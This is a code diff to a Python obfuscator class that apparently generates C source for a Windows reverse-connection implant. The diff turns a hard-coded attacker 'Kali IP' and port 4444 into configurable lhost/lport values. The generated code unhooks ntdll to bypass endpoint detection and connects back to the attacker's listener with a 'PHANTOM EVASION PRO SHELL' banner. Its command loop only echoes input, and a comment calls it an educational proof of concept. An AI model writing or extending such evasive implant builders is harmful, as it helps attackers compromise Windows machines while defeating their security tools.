@@ -217,8 +217,11 @@ class Obfuscator:
             l4.get("description"),
         ]))
 
+        lhost = config.get("lhost", "127.0.0.1")
+        lport = config.get("lport", 4444)
+
         # Generate main logic for WinMain (PRO STABLE BRIDGE)
-        main_logic = """
+        main_logic = f"""
     // --- Layer 2: EDR Bypass Initialization ---
     unhook_ntdll();
 
@@ -227,14 +230,14 @@ class Obfuscator:
     if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) return 0;
 
     SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (s != INVALID_SOCKET) {
+    if (s != INVALID_SOCKET) {{
         struct sockaddr_in addr;
         addr.sin_family = AF_INET;
-        addr.sin_port = htons(4444);
-        addr.sin_addr.s_addr = inet_addr("192.168.0.3"); // Your Kali IP
+        addr.sin_port = htons({lport});
+        addr.sin_addr.s_addr = inet_addr("{lhost}");
 
         // Attempt Stealth Connection
-        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
+        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {{
             char buffer[1024];
             int bytes;
             
@@ -242,15 +245,15 @@ class Obfuscator:
             send(s, "--- PHANTOM EVASION PRO SHELL CONNECTED ---\\n", 45, 0);
             
             // Basic Interactive Loop (Educational Proof-of-Concept)
-            while ((bytes = recv(s, buffer, 1024, 0)) > 0) {
+            while ((bytes = recv(s, buffer, 1024, 0)) > 0) {{
                 buffer[bytes] = '\\0';
                 // Echo back for verification
                 send(s, "CMD RECEIVED: ", 14, 0);
                 send(s, buffer, bytes, 0);
-            }
-        }
+            }}
+        }}
         closesocket(s);
-    }
+    }}
     WSACleanup();
 
     // --- Layer 1: Static Evasion (Keep it for obfuscation integrity) ---
